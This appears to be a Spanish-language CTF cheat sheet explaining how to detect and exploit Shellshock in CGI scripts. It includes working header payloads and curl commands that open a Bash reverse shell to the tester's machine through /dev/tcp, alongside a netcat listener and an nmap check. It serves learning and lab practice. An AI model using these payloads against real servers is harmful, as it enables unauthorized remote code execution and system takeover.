
# 🐚 Shellshock - Detección y Explotación en CTF

## Índice
- [¿Cómo detectar un posible Shellshock?](#detectar)
- [¿En qué consiste?](#consiste)
- [Reconocer pistas en HTTP](#reconocer)
- [Ejemplo de payload para probar](#ejemplopayload)
- [¿Cómo se inyectan?](#inyectan)
- [¿Qué hace el payload?](#payload)
- [¿Qué necesitas?](#necesitas)
- [Ejemplo real](#ejemplo)
- [Notas adicionales](#notas)


---
<a name="detectar"></a>
## 🕵️‍♂️ ¿Cómo detectar un posible Shellshock?

Después de enumerar una máquina, si encontramos un servicio HTTP y realizamos un fuzzing, podemos descubrir una ruta como:

    /cgi-bin

Esto nos da pie para probar este tipo de ataque, ya que los scripts CGI suelen interactuar con Bash.

---
<a name="consiste"></a>
## 🛠️ ¿En qué consiste?

Shellshock permite que un atacante ejecute código arbitrario en el sistema, aprovechando cómo Bash procesa ciertas variables de entorno.

👉 El problema es que Bash permitía definir funciones en variables de entorno, pero continuaba interpretando código tras la función, permitiendo ejecución arbitraria.

Ejemplo:

    env X='() { :;}; echo Vulnerable' bash -c "echo Test"

Si el sistema es vulnerable, mostrará:

    Vulnerable
    Test

👉 Se ejecutó el `echo Vulnerable` fuera de la función.

---
<a name="reconocer"></a>
## 🔍 Reconocer pistas en HTTP

Si encuentras una URL sospechosa (por ejemplo `/cgi-bin/test.cgi`), puedes probar inyecciones en las siguientes cabeceras HTTP:

- User-Agent
- Referer
- Cookie

👉 Estas cabeceras a veces se pasan como variables de entorno a los scripts CGI.

---
<a name="ejemplopayload"></a>
## 🧪 Ejemplo de payload para probar

    () { :; }; echo; echo; /bin/bash -c "echo VULNERABLE"

O con cabecera:

    User-Agent: () { :; }; echo; echo; /bin/bash -c "id"

### Usar Nmap para automatizar:

    nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi -p 80 <IP>

---
<a name="inyectan"></a>
## 🚀 ¿Cómo se inyectan?

Como hemos dicho, normalmente en la cabecera User-Agent, pero también puede funcionar en Referer o Cookie.

### Ejemplo de inyección con curl:

    curl --silent -k \
      -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<TU IP>/<TU PUERTO EN ESCUCHA> 0>&1" \
      "https://172.17.0.2:<PUERTO SI SE NECESITA>/cgi-bin/<RECURSO>.cgi"

### Desglose del comando:

| Parte del comando                                   | Significado                                                       |
|----------------------------------------------------|-------------------------------------------------------------------|
| curl                                               | Cliente para hacer peticiones HTTP                                |
| --silent                                           | No muestra progreso ni información extra                          |
| -k                                                 | Permite conexiones HTTPS sin verificar certificado (útil en CTFs) |
| -H                                                 | Añade una cabecera HTTP personalizada                             |
| User-Agent: ...                                    | Cabecera que contiene el payload de Shellshock                    |
| () { :; };                                         | Inicia la función vacía y luego el código malicioso               |
| /bin/bash -i >& /dev/tcp/<TU IP>/<TU PUERTO> 0>&1  | Intenta abrir una reverse shell hacia tu máquina                  |
| URL final                                          | El recurso vulnerable (normalmente en /cgi-bin/)                  |

---
<a name="payload"></a>
## 🎯 ¿Qué hace el payload?

Está enviando un User-Agent que explota Shellshock.

Si el servidor es vulnerable, ejecutará:

    /bin/bash -i >& /dev/tcp/<TU IP>/<TU PUERTO> 0>&1

👉 Esto crea una reverse shell (una conexión interactiva de Bash de vuelta a tu máquina).

---
<a name="necesitas"></a>
## 🚦 ¿Qué necesitas?

### 1️⃣ Tener un listener en tu máquina:

    nc -lvnp <TU PUERTO EN ESCUCHA>

### 2️⃣ Reemplazar en el curl:

- <TU IP> → tu IP (por ejemplo: 10.10.14.23 si usas HackTheBox)
- <TU PUERTO> → puerto en el que tienes nc escuchando (por ejemplo 4444)
- <PUERTO SI SE NECESITA> → si el server usa un puerto especial (443, 8443, etc.)
- <RECURSO> → el CGI vulnerable (por ejemplo: test.cgi)

---
<a name="ejemplo"></a>
## 🧑‍💻 Ejemplo real

### En escucha en tu máquina:

    nc -lvnp 4444

### Payload:

    curl --silent -k \
      -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.23/4444 0>&1" \
      "https://172.17.0.2/cgi-bin/test.cgi"

👉 Si todo sale bien, recibirás una shell interactiva en tu Netcat. 🚀

---
<a name="notas"></a>
## 📝 Notas adicionales

✅ El ataque también puede realizarse desde Burp Suite, con una cabecera como:

    User-Agent: () { ignored;}; /bin/bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1

✅ No es necesario probar directamente con reverse shell; puedes empezar con comandos simples como:

    User-Agent: () { ignored;}; /bin/bash -c "id"

Si ves una salida como:

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

→ ¡El servidor es vulnerable!

---


